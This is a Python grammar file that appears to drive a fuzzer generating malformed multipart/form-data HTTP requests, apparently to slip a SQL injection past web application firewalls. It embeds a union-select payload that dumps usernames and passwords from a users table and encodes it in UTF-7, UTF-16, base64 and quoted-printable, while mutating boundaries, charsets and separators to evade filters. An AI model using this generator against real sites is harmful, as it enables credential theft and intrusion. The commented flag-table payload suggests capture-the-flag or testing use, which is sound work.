from utils import utf7encode,base64encode
# https://www.rfc-editor.org/rfc/rfc1867

# class ParamNode(Node):
#     def expand(self):
#         super().expand()
TAINT_KEY = "id"
# TAINT_KEY = "data"
# TAINT = "-1 union select 1,key,3 from flag"
TAINT  = "1' union select 1,group_concat(user,0x3a,password) from users #"

grammar = {
    "<start>": [
        ["<content_type_headers>","\r\n\r\n","<body>"]
    ],
    "<content_type_headers>":[
        (["<content_type_header>"],0.7),
        (["<content_type_header>","<next_line>","<content_type_headers>"],0.1),
        (["<content_type_header>","<next_line>","<content_encoding_header>"],0.1),
        (["<content_type_header>","<next_line>","<transfer_encoding_header>"],0.1),
    ],
    "<content_type_header>":[
        ["Content-Type:","<blank_token>","<media_type>","<param_seperator>","<blank_token>","<header_params>"],
    ],
    "<content_encoding_header>":[
        ["Content-Encoding:","<blank_token>","<charset_token>"],
    ],
    "<transfer_encoding_header>":[
        ["Transfer-Encoding:","<blank_token>","chunked"],
        ["Transfer-Encoding:","<blank_token>","chunked",",","chunked"],
    ],
    "<media_type>":[
        (["application/x-www-form-urlencoded"],0.1),
       # ["application/xml"],
       # ["application/json"],
        (["multipart/form-data"],0.8),
        (["text/plain"],0.1)
       # ["multipart/mixed"],
    ],
    "<header_params>":[
        ["<charset_param>","<param_seperator>","<header_params>"],
        ["<boundary_param>","<param_seperator>","<header_params>"],
        ["<media_type>","<param_seperator>","<header_params>"],
        ["<other_param>","<param_seperator>","<header_params>"],
        ["<none>"]
    ],
    r"<(\w+)_param>":[
        [r"<\1_param_key>","=",r"<\1_param_value_field>"],
        [r"<\1_param_key>","*=",r"<\1_param_value_field>"],
    ],
    r"<(\w+)_param_value_field>":[
        ['"',r'<\1_param_value>','"'],
        ["'",r'<\1_param_value>',"'"],
        ["us-ascii","'","en","'",r"<\1_param_value>"],
        [r'<\1_param_value>'],
    ],
    "<charset_param_key>":[
        ["charset"],
    ],
    "<charset_param_value>":[
        ["<charset_token>"],
    ],
    "<boundary_param_key>":[
        ["boundary"]
    ],
    "<boundary_param_value>":[
        ["<boundary_token>"]
    ],
    "<name_param_key>":[
        ["name"],
    ],
    "<name_param_value>":[
        [TAINT_KEY],
    ],
    "<taint_param_key>":[
        [TAINT_KEY],
    ],
    "<taint_param_value>":[
        ["<taint_token>"]
    ],
    "<filename_param_key>":[
        ["filename"]
    ],
    "<urlencoded_params>":[
        ["<other_param>"]
    ],
    "<other_param_key>":[
        ["xxx"],
        ["yyy[0]"],
        ["<filename_param_key>"],
    ],
    "<other_param_value>":[
        ["xxx"],
        ["zzzz"],
        ["<media_type>"]
    ],
    "<body>":[
        #["<urlencoded_body>"],
        # ["<json_body>"],
        # ["<xml_body>"],
        ["<multipart_body>"]
    ],
    # https://www.rfc-editor.org/rfc/rfc1867
    # https://www.ietf.org/rfc/rfc2388.txt
    # https://www.rfc-editor.org/rfc/rfc7578
    "<urlencoded_body>":[
        ["<taint_param>","<param_seperator>","<urlencoded_params>"]
    ],
    "<multipart_body>":[
        ["<multipart>","<multiparts>","<boundary_end_line>"]
    ],
    "<multipart>":[
        ["<boundary_seperator_line>","<content_disposition_header>","<next_line>","<headers>","<next_line>","<multipart_value>","<next_line>"],
    ],
    "<multiparts>":[
        (["<none>"],0.8),
        (["<multipart>","<multiparts>"],0.2)
    ],
    "<multipart_value>":[
        (["<taint_token>"],0.9),
        (["<none>"],0.02),
        (["<multipart>"],0.08),
    ],
    "<boundary_seperator_line>":[
        ["--","<boundary_token>","<next_line>"],
    ],
    "<boundary_end_line>":[
        ["--","<boundary_token>","--","<next_line>"],
    ],
    "<content_disposition_header>":[
        ["Content-Disposition:","<blank_token>","<form_data_token>","<param_seperator>","<name_param>","<param_seperator>","<other_param>"],
    ],
    "<content_transfer_encoding_header>":[
        ["Content-Transfer-Encoding:","<blank_token>","<charset_token>"]
    ],
    "<headers>":[
        (["<content_disposition_header>","<next_line>","<headers>"],0.1),
        (["<content_transfer_encoding_header>","<next_line>","<headers>"],0.2),
        (["<content_type_header>","<next_line>","<headers>"],0.1),
        (["<none>"],0.6)
    ],
    "<param_seperator>":[
        ([";"],0.6),
        (["&"],0.3),
        (["<blank_token>"],0.1),
    ],
    "<next_line>":[
        (["\r\n"],0.9),
        (["\n"],0.05),
        (["\r"],0.05),
    ],
    "<form_data_token>":[
        (["form-data"],0.8),
        (["xxx"],0.2),
    ],
    "<none>":[
        [""]
    ],
    "<boundary_token>":[
        (["boundary"],0.8),
        (["boun dary"],0.1),
        ([""],0.1)
    ],
    "<charset_token>":[
        ["utf-8"],
        ["utf-7"],
        ["utf-16"],
        ["base64"],
        ['quoted-printable'],
    ],
    "<blank_token>":[
        ([" "],0.8),
        (["\t",0.1]),
        ([" "],0.1)
    ],
    "<taint_token>":[
        ([TAINT],0.6),
        ([utf7encode(TAINT)],0.1),
        ([TAINT.encode("utf-16be").decode("utf-8")],0.1),
        ([base64encode(TAINT)],0.1),
        ([''.join(["="+hex(ord(x))[2:].upper() for x in TAINT])],0.1),
    ],
}
